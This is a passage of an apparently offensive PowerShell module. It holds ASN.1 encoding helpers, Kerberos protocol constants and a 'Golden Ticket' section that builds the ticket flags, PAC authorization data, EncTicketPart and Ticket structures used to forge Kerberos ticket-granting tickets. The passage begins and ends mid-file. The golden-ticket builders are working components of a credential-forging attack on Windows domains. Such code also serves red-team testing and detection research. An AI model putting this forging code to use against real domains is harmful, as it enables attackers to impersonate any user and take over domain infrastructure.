#endregion

#region ASN.1 Time Encoders

<#
.SYNOPSIS
    Encodes a GeneralizedTime in ASN.1 DER format.
#>
function New-ASN1GeneralizedTime {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [datetime]$Value
    )

    # Format: YYYYMMDDHHMMSSZ
    $timeString = $Value.ToUniversalTime().ToString("yyyyMMddHHmmss") + "Z"
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($timeString)
    $tag = [byte]$Script:ASN1_GENERALIZED_TIME
    $lengthBytes = New-ASN1Length -Length $bytes.Length

    return [byte[]](@($tag) + $lengthBytes + $bytes)
}

<#
.SYNOPSIS
    Encodes a UTCTime in ASN.1 DER format.
#>
function New-ASN1UTCTime {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [datetime]$Value
    )

    # Format: YYMMDDHHMMSSZ
    $timeString = $Value.ToUniversalTime().ToString("yyMMddHHmmss") + "Z"
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($timeString)
    $tag = [byte]$Script:ASN1_UTC_TIME
    $lengthBytes = New-ASN1Length -Length $bytes.Length

    return [byte[]](@($tag) + $lengthBytes + $bytes)
}

#endregion

#region ASN.1 Constructed Type Encoders

<#
.SYNOPSIS
    Encodes a SEQUENCE in ASN.1 DER format.
#>
function New-ASN1Sequence {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        $Data  # Accept any array type, convert to byte[] internally
    )

    # Force conversion to byte[] - handles Object[] from PowerShell array concatenation
    $dataBytes = [byte[]]$Data

    $tag = [byte]$Script:ASN1_SEQUENCE
    $lengthBytes = New-ASN1Length -Length $dataBytes.Length

    $result = New-Object System.Collections.Generic.List[byte]
    $result.Add($tag)
    $result.AddRange([byte[]]$lengthBytes)
    $result.AddRange($dataBytes)
    return [byte[]]$result.ToArray()
}

<#
.SYNOPSIS
    Encodes a SET in ASN.1 DER format.
#>
function New-ASN1Set {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        $Data  # Accept any array type, convert to byte[] internally
    )

    # Force conversion to byte[] - handles Object[] from PowerShell array concatenation
    $dataBytes = [byte[]]$Data

    $tag = [byte]$Script:ASN1_SET
    $lengthBytes = New-ASN1Length -Length $dataBytes.Length

    $result = New-Object System.Collections.Generic.List[byte]
    $result.Add($tag)
    $result.AddRange([byte[]]$lengthBytes)
    $result.AddRange($dataBytes)
    return [byte[]]$result.ToArray()
}

#endregion

#region ASN.1 Tagged Type Encoders

<#
.SYNOPSIS
    Encodes data with a context-specific tag (EXPLICIT).
#>
function New-ASN1ContextTag {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$Tag,

        [Parameter(Mandatory=$true)]
        $Data,  # Accept any array type, convert to byte[] internally

        [Parameter(Mandatory=$false)]
        [switch]$Implicit
    )

    # Force conversion to byte[] - handles Object[] from PowerShell array concatenation
    $dataBytes = [byte[]]$Data

    if ($Tag -lt 0 -or $Tag -gt 30) {
        throw "Context tag must be 0-30 for short form"
    }

    $tagByte = [byte]($Script:ASN1_CLASS_CONTEXT -bor $Tag)

    if (-not $Implicit) {
        # Explicit: constructed (wraps content)
        $tagByte = $tagByte -bor $Script:ASN1_CONSTRUCTED
    }

    $lengthBytes = New-ASN1Length -Length $dataBytes.Length

    $result = New-Object System.Collections.Generic.List[byte]
    $result.Add($tagByte)
    $result.AddRange([byte[]]$lengthBytes)
    $result.AddRange($dataBytes)
    return [byte[]]$result.ToArray()
}

<#
.SYNOPSIS
    Encodes data with an application tag.
#>
function New-ASN1ApplicationTag {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$Tag,

        [Parameter(Mandatory=$true)]
        $Data  # Accept any array type, convert to byte[] internally
    )

    # Force conversion to byte[] - handles Object[] from PowerShell array concatenation
    $dataBytes = [byte[]]$Data

    if ($Tag -lt 0 -or $Tag -gt 30) {
        throw "Application tag must be 0-30 for short form"
    }

    # Application tags are typically constructed
    $tagByte = [byte]($Script:ASN1_CLASS_APPLICATION -bor $Script:ASN1_CONSTRUCTED -bor $Tag)
    $lengthBytes = New-ASN1Length -Length $dataBytes.Length

    $result = New-Object System.Collections.Generic.List[byte]
    $result.Add($tagByte)
    $result.AddRange([byte[]]$lengthBytes)
    $result.AddRange($dataBytes)
    return [byte[]]$result.ToArray()
}

#endregion

#region ASN.1 Decoders

<#
.SYNOPSIS
    Reads and parses an ASN.1 TLV (Tag-Length-Value) structure.
#>
function Read-ASN1Element {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data,

        [Parameter(Mandatory=$false)]
        [int]$Offset = 0
    )

    if ($Offset -ge $Data.Length) {
        throw "ASN.1 read: offset beyond data"
    }

    $startOffset = $Offset

    # Read tag
    $tag = $Data[$Offset]
    $Offset++

    # Determine tag class and construction
    $tagClass = $tag -band 0xC0
    $isConstructed = ($tag -band 0x20) -ne 0
    $tagNumber = $tag -band 0x1F

    # Handle long-form tags (tag number = 31)
    if ($tagNumber -eq 0x1F) {
        $tagNumber = 0
        do {
            if ($Offset -ge $Data.Length) {
                throw "ASN.1 read: incomplete long-form tag"
            }
            $tagByte = $Data[$Offset]
            $tagNumber = ($tagNumber -shl 7) -bor ($tagByte -band 0x7F)
            $Offset++
        } while ($tagByte -band 0x80)
    }

    # Read length
    $lengthInfo = Read-ASN1Length -Data $Data -Offset $Offset
    $contentLength = $lengthInfo.Length
    $Offset += $lengthInfo.BytesConsumed

    # Extract content
    if ($Offset + $contentLength -gt $Data.Length) {
        throw "ASN.1 read: content extends beyond data (offset=$Offset, length=$contentLength, data.length=$($Data.Length))"
    }

    $content = if ($contentLength -gt 0) {
        $Data[$Offset..($Offset + $contentLength - 1)]
    } else {
        @()
    }

    $totalLength = ($Offset - $startOffset) + $contentLength

    return [PSCustomObject]@{
        Tag = $tag
        TagClass = $tagClass
        TagNumber = $tagNumber
        IsConstructed = $isConstructed
        ContentLength = $contentLength
        Content = [byte[]]$content
        TotalLength = $totalLength
        HeaderLength = $Offset - $startOffset
    }
}

<#
.SYNOPSIS
    Parses all elements in a constructed ASN.1 structure.
#>
function Read-ASN1Children {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data
    )

    $children = [System.Collections.Generic.List[PSCustomObject]]::new()
    $offset = 0

    while ($offset -lt $Data.Length) {
        $element = Read-ASN1Element -Data $Data -Offset $offset
        $children.Add($element)
        $offset += $element.TotalLength
    }

    # Use Write-Output -NoEnumerate to prevent PowerShell from unwrapping
    # single-element arrays (classic PS gotcha: function returns scalar instead of array)
    Write-Output -NoEnumerate $children.ToArray()
}

<#
.SYNOPSIS
    Decodes an ASN.1 INTEGER to a numeric value or BigInteger.
#>
function Read-ASN1Integer {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Content
    )

    # DER specification does not allow empty INTEGER content
    if ($Content.Length -eq 0) {
        throw "Invalid ASN.1 INTEGER: content cannot be empty"
    }

    # For small integers, return as int64
    if ($Content.Length -le 8) {
        $value = [int64]0
        $isNegative = ($Content[0] -band 0x80) -ne 0

        foreach ($byte in $Content) {
            $value = ($value -shl 8) -bor $byte
        }

        # Handle negative numbers (two's complement)
        if ($isNegative) {
            $mask = [int64]::MaxValue -shr ((8 - $Content.Length) * 8)
            $value = $value -bor (-bnot $mask)
        }

        return $value
    }
    else {
        # For large integers, return as BigInteger
        $bytes = $Content.Clone()
        [Array]::Reverse($bytes)  # BigInteger expects little-endian
        return [System.Numerics.BigInteger]::new($bytes)
    }
}

<#
.SYNOPSIS
    Decodes an ASN.1 BIT STRING.
#>
function Read-ASN1BitString {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Content
    )

    if ($Content.Length -eq 0) {
        return @{
            UnusedBits = 0
            Data = @()
        }
    }

    # Validate UnusedBits per DER specification (must be 0-7)
    $unusedBits = [int]$Content[0]
    if ($unusedBits -gt 7) {
        throw "Invalid BIT STRING: unused bits must be 0-7, got $unusedBits"
    }

    return @{
        UnusedBits = $unusedBits
        Data = if ($Content.Length -gt 1) { $Content[1..($Content.Length - 1)] } else { @() }
    }
}

<#
.SYNOPSIS
    Decodes an ASN.1 OID to string format.
#>
function Read-ASN1ObjectIdentifier {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Content
    )

    if ($Content.Length -eq 0) {
        return ""
    }

    $components = [System.Collections.Generic.List[int]]::new()

    # First byte encodes first two components
    $components.Add([int]($Content[0] / 40))
    $components.Add([int]($Content[0] % 40))

    # Remaining bytes use base-128 encoding
    # Use [long] to prevent integer overflow with large OID components
    [long]$value = 0
    for ($i = 1; $i -lt $Content.Length; $i++) {
        $byte = $Content[$i]
        $value = ($value -shl 7) -bor ($byte -band 0x7F)

        if (-not ($byte -band 0x80)) {
            $components.Add($value)
            $value = 0
        }
    }

    return $components -join '.'
}

<#
.SYNOPSIS
    Decodes an ASN.1 GeneralizedTime to DateTime.
#>
function Read-ASN1GeneralizedTime {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Content
    )

    $timeString = [System.Text.Encoding]::ASCII.GetString($Content)

    # Remove trailing 'Z'
    $timeString = $timeString.TrimEnd('Z')

    # Parse YYYYMMDDHHMMSS
    if ($timeString.Length -ge 14) {
        $year = [int]$timeString.Substring(0, 4)
        $month = [int]$timeString.Substring(4, 2)
        $day = [int]$timeString.Substring(6, 2)
        $hour = [int]$timeString.Substring(8, 2)
        $minute = [int]$timeString.Substring(10, 2)
        $second = [int]$timeString.Substring(12, 2)

        return [datetime]::new($year, $month, $day, $hour, $minute, $second, [System.DateTimeKind]::Utc)
    }

    throw "Invalid GeneralizedTime format: $timeString"
}

<#
.SYNOPSIS
    Decodes an ASN.1 string (GeneralString, UTF8String, etc.).
#>
function Read-ASN1String {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Content,

        [Parameter(Mandatory=$false)]
        [string]$Encoding = "ASCII"
    )

    switch ($Encoding) {
        "UTF8" { return [System.Text.Encoding]::UTF8.GetString($Content) }
        "Unicode" { return [System.Text.Encoding]::Unicode.GetString($Content) }
        default { return [System.Text.Encoding]::ASCII.GetString($Content) }
    }
}

#endregion

#region Kerberos-Specific ASN.1 Helpers

<#
.SYNOPSIS
    Creates a Kerberos PrincipalName structure.
#>
function New-KerberosPrincipalName {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$NameType,

        [Parameter(Mandatory=$true)]
        [string[]]$NameStrings
    )

    # name-type [0] Int32
    $nameTypeASN = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $NameType)

    # name-string [1] SEQUENCE OF GeneralString
    $nameStringsData = @()
    foreach ($name in $NameStrings) {
        $nameStringsData += New-ASN1GeneralString -Value $name
    }
    $nameStringSeq = New-ASN1Sequence -Data $nameStringsData
    $nameStringASN = New-ASN1ContextTag -Tag 1 -Data $nameStringSeq

    return New-ASN1Sequence -Data ($nameTypeASN + $nameStringASN)
}

<#
.SYNOPSIS
    Creates a Kerberos EncryptedData structure.
#>
function New-KerberosEncryptedData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$EType,

        [Parameter(Mandatory=$false)]
        [int]$Kvno,

        [Parameter(Mandatory=$true)]
        [byte[]]$Cipher
    )

    # etype [0] Int32
    $etypeASN = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $EType)

    $data = $etypeASN

    # kvno [1] UInt32 OPTIONAL
    if ($PSBoundParameters.ContainsKey('Kvno')) {
        $kvnoASN = New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value $Kvno)
        $data += $kvnoASN
    }

    # cipher [2] OCTET STRING
    $cipherASN = New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $Cipher)
    $data += $cipherASN

    return New-ASN1Sequence -Data $data
}

<#
.SYNOPSIS
    Creates a Kerberos PA-DATA structure.
#>
function New-KerberosPAData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$PADataType,

        [Parameter(Mandatory=$true)]
        [byte[]]$PADataValue
    )

    # padata-type [1] Int32
    $typeASN = New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value $PADataType)

    # padata-value [2] OCTET STRING
    $valueASN = New-ASN1ContextTag -Tag 2 -Data (New-ASN1OctetString -Value $PADataValue)

    return New-ASN1Sequence -Data ($typeASN + $valueASN)
}

<#
.SYNOPSIS
    Creates Kerberos KDC-Options as BIT STRING.
#>
function New-KerberosKDCOptions {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [switch]$Forwardable,

        [Parameter(Mandatory=$false)]
        [switch]$Forwarded,

        [Parameter(Mandatory=$false)]
        [switch]$Proxiable,

        [Parameter(Mandatory=$false)]
        [switch]$Proxy,

        [Parameter(Mandatory=$false)]
        [switch]$AllowPostdate,

        [Parameter(Mandatory=$false)]
        [switch]$Postdated,

        [Parameter(Mandatory=$false)]
        [switch]$Renewable,

        [Parameter(Mandatory=$false)]
        [switch]$Canonicalize,

        [Parameter(Mandatory=$false)]
        [switch]$RenewableOK,

        [Parameter(Mandatory=$false)]
        [switch]$EncTktInSkey,

        [Parameter(Mandatory=$false)]
        [switch]$CnameInAddlTkt,

        [Parameter(Mandatory=$false)]
        [switch]$DisableTransitedCheck
    )

    # KDC Options is a 32-bit field (4 bytes)
    $options = [uint32]0

    # Bit positions (from RFC 4120)
    if ($Forwardable)           { $options = $options -bor 0x40000000 }  # bit 1
    if ($Forwarded)             { $options = $options -bor 0x20000000 }  # bit 2
    if ($Proxiable)             { $options = $options -bor 0x10000000 }  # bit 3
    if ($Proxy)                 { $options = $options -bor 0x08000000 }  # bit 4
    if ($AllowPostdate)         { $options = $options -bor 0x04000000 }  # bit 5
    if ($Postdated)             { $options = $options -bor 0x02000000 }  # bit 6
    if ($Renewable)             { $options = $options -bor 0x00800000 }  # bit 8
    if ($Canonicalize)          { $options = $options -bor 0x00010000 }  # bit 15
    if ($CnameInAddlTkt)        { $options = $options -bor 0x00020000 }  # bit 14
    if ($RenewableOK)           { $options = $options -bor 0x00000010 }  # bit 27
    if ($EncTktInSkey)          { $options = $options -bor 0x00000008 }  # bit 28
    if ($DisableTransitedCheck) { $options = $options -bor 0x00000020 }  # bit 26

    # Convert to big-endian bytes
    $optionBytes = [System.BitConverter]::GetBytes($options)
    [Array]::Reverse($optionBytes)

    # BIT STRING with 0 unused bits
    return New-ASN1BitString -Value $optionBytes -UnusedBits 0
}

#endregion

#region Kerberos Constants

# Kerberos message types
$Script:KRB_AS_REQ  = 10
$Script:KRB_AS_REP  = 11
$Script:KRB_TGS_REQ = 12
$Script:KRB_TGS_REP = 13
$Script:KRB_AP_REQ  = 14
$Script:KRB_AP_REP  = 15
$Script:KRB_ERROR   = 30

# Principal name types
$Script:NT_UNKNOWN        = 0
$Script:NT_PRINCIPAL      = 1
$Script:NT_SRV_INST       = 2
$Script:NT_SRV_HST        = 3
$Script:NT_SRV_XHST       = 4
$Script:NT_UID            = 5
$Script:NT_X500_PRINCIPAL = 6
$Script:NT_SMTP_NAME      = 7
$Script:NT_ENTERPRISE     = 10

# Encryption types
$Script:ETYPE_DES_CBC_CRC            = 1
$Script:ETYPE_DES_CBC_MD4            = 2
$Script:ETYPE_DES_CBC_MD5            = 3
$Script:ETYPE_RC4_HMAC               = 23
$Script:ETYPE_RC4_HMAC_EXP           = 24
$Script:ETYPE_AES128_CTS_HMAC_SHA1   = 17
$Script:ETYPE_AES256_CTS_HMAC_SHA1   = 18

# PA-DATA types
$Script:PA_TGS_REQ           = 1
$Script:PA_ENC_TIMESTAMP     = 2
$Script:PA_PK_AS_REQ         = 16
$Script:PA_PK_AS_REP         = 17
$Script:PA_ETYPE_INFO        = 11
$Script:PA_ETYPE_INFO2       = 19
$Script:PA_PAC_REQUEST       = 128
$Script:PA_FOR_USER          = 129
$Script:PA_PAC_OPTIONS       = 167

# AuthorizationData AD-TYPE values (RFC 4120)
$Script:AD_IF_RELEVANT = 1              # AuthorizationData is relevant to the application
$Script:AD_INTENDED_FOR_SERVER = 2      # Intended for specific server
$Script:AD_INTENDED_FOR_APP_CLASS = 3   # Intended for application class
$Script:AD_KDC_ISSUED = 4               # KDC-issued data
$Script:AD_AND_OR = 5                   # Conjunctive or disjunctive
$Script:AD_MANDATORY_TICKET_EXTENSIONS = 6
$Script:AD_IN_TICKET_EXTENSIONS = 7
$Script:AD_MANDATORY_FOR_KDC = 8
$Script:AD_WIN2K_PAC = 128              # Windows PAC (Privilege Attribute Certificate)

# Ticket Flags (RFC 4120 Section 5.3) - bit positions (MSB=bit 0)
$Script:TKT_FLAG_RESERVED = 0
$Script:TKT_FLAG_FORWARDABLE = 1
$Script:TKT_FLAG_FORWARDED = 2
$Script:TKT_FLAG_PROXIABLE = 3
$Script:TKT_FLAG_PROXY = 4
$Script:TKT_FLAG_MAY_POSTDATE = 5
$Script:TKT_FLAG_POSTDATED = 6
$Script:TKT_FLAG_INVALID = 7
$Script:TKT_FLAG_RENEWABLE = 8
$Script:TKT_FLAG_INITIAL = 9
$Script:TKT_FLAG_PRE_AUTHENT = 10
$Script:TKT_FLAG_HW_AUTHENT = 11
$Script:TKT_FLAG_TRANSITED_POLICY_CHECKED = 12
$Script:TKT_FLAG_OK_AS_DELEGATE = 13
$Script:TKT_FLAG_ANONYMOUS = 14
$Script:TKT_FLAG_NAME_CANONICALIZE = 15
$Script:TKT_FLAG_ENC_PA_REP = 16

#endregion

#region Golden Ticket ASN.1 Structures

<#
.SYNOPSIS
    Creates TicketFlags BIT STRING from flag switches.
.DESCRIPTION
    Converts ticket flag parameters to the 32-bit BIT STRING format used in Kerberos tickets.
    Default flags for a TGT: Forwardable, Renewable, Initial, Pre-Authent.
#>
function New-TicketFlags {
    [CmdletBinding()]
    param(
        [switch]$Forwardable,
        [switch]$Forwarded,
        [switch]$Proxiable,
        [switch]$Proxy,
        [switch]$MayPostdate,
        [switch]$Postdated,
        [switch]$Invalid,
        [switch]$Renewable,
        [switch]$Initial,
        [switch]$PreAuthent,
        [switch]$HwAuthent,
        [switch]$TransitedPolicyChecked,
        [switch]$OkAsDelegate,
        [switch]$Anonymous,
        [switch]$NameCanonicalize,
        [switch]$EncPaRep,
        [byte[]]$RawFlags  # Alternative: pass 4 bytes directly
    )

    if ($RawFlags -and $RawFlags.Length -eq 4) {
        return $RawFlags
    }

    # Build 32-bit flags (big-endian, MSB = bit 0)
    [uint32]$flags = 0

    if ($Forwardable)             { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_FORWARDABLE)) }
    if ($Forwarded)               { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_FORWARDED)) }
    if ($Proxiable)               { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_PROXIABLE)) }
    if ($Proxy)                   { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_PROXY)) }
    if ($MayPostdate)             { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_MAY_POSTDATE)) }
    if ($Postdated)               { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_POSTDATED)) }
    if ($Invalid)                 { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_INVALID)) }
    if ($Renewable)               { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_RENEWABLE)) }
    if ($Initial)                 { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_INITIAL)) }
    if ($PreAuthent)              { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_PRE_AUTHENT)) }
    if ($HwAuthent)               { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_HW_AUTHENT)) }
    if ($TransitedPolicyChecked)  { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_TRANSITED_POLICY_CHECKED)) }
    if ($OkAsDelegate)            { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_OK_AS_DELEGATE)) }
    if ($Anonymous)               { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_ANONYMOUS)) }
    if ($NameCanonicalize)        { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_NAME_CANONICALIZE)) }
    if ($EncPaRep)                { $flags = $flags -bor (1 -shl (31 - $Script:TKT_FLAG_ENC_PA_REP)) }

    # Convert to big-endian bytes
    return [byte[]]@(
        (($flags -shr 24) -band 0xFF),
        (($flags -shr 16) -band 0xFF),
        (($flags -shr 8) -band 0xFF),
        ($flags -band 0xFF)
    )
}

<#
.SYNOPSIS
    Creates a TransitedEncoding structure.
.DESCRIPTION
    TransitedEncoding ::= SEQUENCE {
        tr-type [0] Int32 -- 1 = DOMAIN-X500-COMPRESS
        contents [1] OCTET STRING
    }
    For tickets that didn't cross realm boundaries, contents is empty.
#>
function New-TransitedEncoding {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [int]$TransitType = 0,  # Rubeus uses 0 for non-cross-realm tickets

        [Parameter(Mandatory=$false)]
        [byte[]]$Contents = @()
    )

    $trTypeASN = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $TransitType)
    $contentsASN = New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $Contents)

    return New-ASN1Sequence -Data ($trTypeASN + $contentsASN)
}

<#
.SYNOPSIS
    Creates an AuthorizationData structure for PAC embedding.
.DESCRIPTION
    AuthorizationData ::= SEQUENCE OF SEQUENCE {
        ad-type [0] Int32,
        ad-data [1] OCTET STRING
    }
    For PAC, we use AD-IF-RELEVANT containing AD-WIN2K-PAC.
#>
function New-AuthorizationData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [int]$ADType,

        [Parameter(Mandatory=$true)]
        [byte[]]$ADData
    )

    $adTypeASN = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $ADType)
    $adDataASN = New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $ADData)

    $adEntry = New-ASN1Sequence -Data ($adTypeASN + $adDataASN)

    return New-ASN1Sequence -Data $adEntry
}

<#
.SYNOPSIS
    Creates a nested AuthorizationData structure with PAC.
.DESCRIPTION
    For Windows PAC, the structure is:
    AD-IF-RELEVANT [1] containing:
        AD-WIN2K-PAC [128] containing:
            PAC binary data
#>
function New-PACAuthorizationData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$PACData
    )

    # Inner: AD-WIN2K-PAC with PAC data
    $pacAdTypeASN = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $Script:AD_WIN2K_PAC)
    $pacAdDataASN = New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $PACData)
    $pacAdEntry = New-ASN1Sequence -Data ($pacAdTypeASN + $pacAdDataASN)
    $pacAdSeq = New-ASN1Sequence -Data $pacAdEntry

    # Outer: AD-IF-RELEVANT containing the PAC AD
    $ifRelevantTypeASN = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $Script:AD_IF_RELEVANT)
    $ifRelevantDataASN = New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $pacAdSeq)
    $ifRelevantEntry = New-ASN1Sequence -Data ($ifRelevantTypeASN + $ifRelevantDataASN)

    return New-ASN1Sequence -Data $ifRelevantEntry
}

<#
.SYNOPSIS
    Creates an EncTicketPart structure for Golden Ticket.

.DESCRIPTION
    Builds the encrypted portion of a Kerberos ticket.

    EncTicketPart ::= [APPLICATION 3] SEQUENCE {
        flags [0] TicketFlags,
        key [1] EncryptionKey,
        crealm [2] Realm,
        cname [3] PrincipalName,
        transited [4] TransitedEncoding,
        authtime [5] KerberosTime,
        starttime [6] KerberosTime OPTIONAL,
        endtime [7] KerberosTime,
        renew-till [8] KerberosTime OPTIONAL,
        caddr [9] HostAddresses OPTIONAL,
        authorization-data [10] AuthorizationData OPTIONAL
    }

.PARAMETER SessionKey
    The session key bytes.

.PARAMETER SessionKeyType
    The encryption type of the session key (17, 18, or 23).

.PARAMETER ClientRealm
    The client's realm (domain name in uppercase).

.PARAMETER ClientName
    The client principal name (sAMAccountName).

.PARAMETER AuthTime
    Authentication time.

.PARAMETER StartTime
    Optional ticket start time.

.PARAMETER EndTime
    Ticket expiration time.

.PARAMETER RenewTill
    Optional renewal time.

.PARAMETER PACData
    Optional PAC bytes to embed in authorization-data.

.PARAMETER TicketFlags
    Optional 4-byte ticket flags. Defaults to standard TGT flags.

.OUTPUTS
    Byte array containing the EncTicketPart structure (unencrypted).
#>
function New-EncTicketPart {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$SessionKey,

        [Parameter(Mandatory=$true)]
        [int]$SessionKeyType,

        [Parameter(Mandatory=$true)]
        [string]$ClientRealm,

        [Parameter(Mandatory=$true)]
        [string]$ClientName,

        [Parameter(Mandatory=$true)]
        [datetime]$AuthTime,

        [Parameter(Mandatory=$false)]
        [datetime]$StartTime,

        [Parameter(Mandatory=$true)]
        [datetime]$EndTime,

        [Parameter(Mandatory=$false)]
        [datetime]$RenewTill,

        [Parameter(Mandatory=$false)]
        [byte[]]$PACData,

        [Parameter(Mandatory=$false)]
        [byte[]]$TicketFlags
    )

    # Default flags: Forwardable, Renewable, Initial, Pre-Authent
    if (-not $TicketFlags -or $TicketFlags.Length -ne 4) {
        $TicketFlags = New-TicketFlags -Forwardable -Renewable -Initial -PreAuthent
    }

    $content = @()

    # [0] flags - TicketFlags
    $content += New-ASN1ContextTag -Tag 0 -Data (New-ASN1BitString -Value $TicketFlags)

    # [1] key - EncryptionKey
    $keyContent = @()
    $keyContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $SessionKeyType)
    $keyContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1OctetString -Value $SessionKey)
    $encKey = New-ASN1Sequence -Data $keyContent
    $content += New-ASN1ContextTag -Tag 1 -Data $encKey

    # [2] crealm - Realm
    $content += New-ASN1ContextTag -Tag 2 -Data (New-ASN1GeneralString -Value $ClientRealm.ToUpper())

    # [3] cname - PrincipalName (NT-PRINCIPAL = 1)
    $cnameContent = @()
    $cnameContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 1)  # NT-PRINCIPAL
    $cnameContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data (New-ASN1GeneralString -Value $ClientName))
    $content += New-ASN1ContextTag -Tag 3 -Data (New-ASN1Sequence -Data $cnameContent)

    # [4] transited - TransitedEncoding (empty for non-cross-realm)
    $content += New-ASN1ContextTag -Tag 4 -Data (New-TransitedEncoding)

    # [5] authtime - KerberosTime
    $content += New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $AuthTime)

    # [6] starttime - KerberosTime OPTIONAL
    if ($StartTime) {
        $content += New-ASN1ContextTag -Tag 6 -Data (New-ASN1GeneralizedTime -Value $StartTime)
    }

    # [7] endtime - KerberosTime
    $content += New-ASN1ContextTag -Tag 7 -Data (New-ASN1GeneralizedTime -Value $EndTime)

    # [8] renew-till - KerberosTime OPTIONAL
    if ($RenewTill) {
        $content += New-ASN1ContextTag -Tag 8 -Data (New-ASN1GeneralizedTime -Value $RenewTill)
    }

    # [9] caddr - HostAddresses OPTIONAL (not included for golden tickets)

    # [10] authorization-data - AuthorizationData OPTIONAL (contains PAC)
    if ($PACData -and $PACData.Length -gt 0) {
        $authzData = New-PACAuthorizationData -PACData $PACData
        $content += New-ASN1ContextTag -Tag 10 -Data $authzData
    }

    # Wrap in SEQUENCE and APPLICATION 3 tag
    $encTicketPartSeq = New-ASN1Sequence -Data $content
    return New-ASN1ApplicationTag -Tag 3 -Data $encTicketPartSeq
}

<#
.SYNOPSIS
    Creates a complete Ticket structure.

.DESCRIPTION
    Builds a Kerberos Ticket structure ready for inclusion in KRB-CRED.

    Ticket ::= [APPLICATION 6] SEQUENCE {
        tkt-vno [0] INTEGER (5),
        realm [1] Realm,
        sname [2] PrincipalName,
        enc-part [3] EncryptedData
    }

.PARAMETER Realm
    The realm (domain name in uppercase).

.PARAMETER ServerName
    The server principal name (e.g., "krbtgt" for TGT).

.PARAMETER ServerInstance
    The server instance (e.g., realm for TGT).

.PARAMETER EncryptedPart
    The encrypted EncTicketPart bytes.

.PARAMETER EncryptionType
    The encryption type used (17, 18, or 23).

.PARAMETER Kvno
    Key version number (optional, typically 2 for krbtgt).

.OUTPUTS
    Byte array containing the complete Ticket structure.
#>
function New-KerberosTicket {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$Realm,

        [Parameter(Mandatory=$true)]
        [string]$ServerName,

        [Parameter(Mandatory=$false)]
        [string]$ServerInstance,

        [Parameter(Mandatory=$true)]
        [byte[]]$EncryptedPart,

        [Parameter(Mandatory=$true)]
        [int]$EncryptionType,

        [Parameter(Mandatory=$false)]
        [int]$Kvno = 2
    )

    $content = @()

    # [0] tkt-vno - INTEGER (5)
    $content += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 5)

    # [1] realm - Realm
    $content += New-ASN1ContextTag -Tag 1 -Data (New-ASN1GeneralString -Value $Realm.ToUpper())

    # [2] sname - PrincipalName
    if ($ServerInstance) {
        # NT-SRV-INST (2) for krbtgt/REALM
        $snameContent = @()
        $snameContent += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value 2)  # NT-SRV-INST
        $nameSeq = (New-ASN1GeneralString -Value $ServerName) + (New-ASN1GeneralString -Value $ServerInstance)
        $snameContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Sequence -Data $nameSeq)
